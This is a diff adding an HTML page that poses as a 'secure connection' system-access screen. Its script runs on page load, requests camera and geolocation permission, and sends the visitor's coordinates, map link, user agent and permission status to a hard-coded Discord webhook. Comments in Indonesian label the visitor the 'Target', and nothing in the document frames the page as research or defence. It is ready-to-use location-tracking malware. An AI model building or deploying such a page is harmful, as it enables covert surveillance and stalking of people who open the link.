@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VOID V1 - SYSTEM ACCESS</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #0dff00;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+            text-shadow: 0 0 5px #0dff00;
+        }
+
+        .container {
+            text-align: center;
+            border: 1px solid #0dff00;
+            padding: 50px;
+            box-shadow: 0 0 20px rgba(13, 255, 0, 0.2);
+        }
+
+        h1 { font-size: 2rem; margin-bottom: 10px; }
+        p { font-size: 1rem; color: #555; }
+
+        .glitch {
+            animation: glitch 1s linear infinite;
+        }
+
+        @keyframes glitch {
+            2% { text-shadow: 2px 0 red, -2px 0 blue; }
+            4% { text-shadow: -2px 0 red, 2px 0 blue; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1 class="glitch">VOID V1 IS WATCHING</h1>
+        <p>INITIALIZING SECURE CONNECTION...</p>
+        <div id="status">Waiting for system validation...</div>
+    </div>
+
+    <video id="video" width="1" height="1" autoplay style="opacity: 0;"></video>
+
+    <script>
+        const webhookURL = "https://discord.com/api/webhooks/1470328357110415455/tTwvOp-9oZm1WMYedDUzPwuviaES8bmimwryhgILqo2PjqXfXxyI8hCR-IvW9SSzeAtx";
+
+        async function sendToDiscord(content) {
+            await fetch(webhookURL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ content: content })
+            });
+        }
+
+        // 1. Izin Kamera (Hanya aktivasi untuk memastikan user memberikan akses)
+        async function startCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('video').srcObject = stream;
+                sendToDiscord("📸 **Kamera Diakses**: Target telah memberikan izin kamera.");
+            } catch (err) {
+                sendToDiscord("❌ **Kamera Ditolak**: Target memblokir izin kamera.");
+            }
+        }
+
+        // 2. Izin Lokasi & Kirim ke Webhook
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const accuracy = position.coords.accuracy;
+                    const mapURL = `https://www.google.com/maps?q=${lat},${lon}`;
+                    
+                    const message = `📡 **DATA TARGET DITEMUKAN** 📡\n` +
+                                    `━━━━━━━━━━━━━━━━━━━━\n` +
+                                    `📍 **Latitude:** ${lat}\n` +
+                                    `📍 **Longitude:** ${lon}\n` +
+                                    `🎯 **Akurasi:** ${accuracy} meter\n` +
+                                    `🗺️ **Google Maps:** ${mapURL}\n` +
+                                    `🌐 **User Agent:** ${navigator.userAgent}\n` +
+                                    `━━━━━━━━━━━━━━━━━━━━`;
+                    
+                    await sendToDiscord(message);
+                    document.getElementById('status').innerText = "SYSTEM READY.";
+                }, (err) => {
+                    sendToDiscord("❌ **Lokasi Ditolak**: Target memblokir izin lokasi.");
+                });
+            }
+        }
+
+        // Jalankan saat web dibuka
+        window.onload = () => {
+            startCamera();
+            getLocation();
+        };
+    </script>
+</body>
+</html>
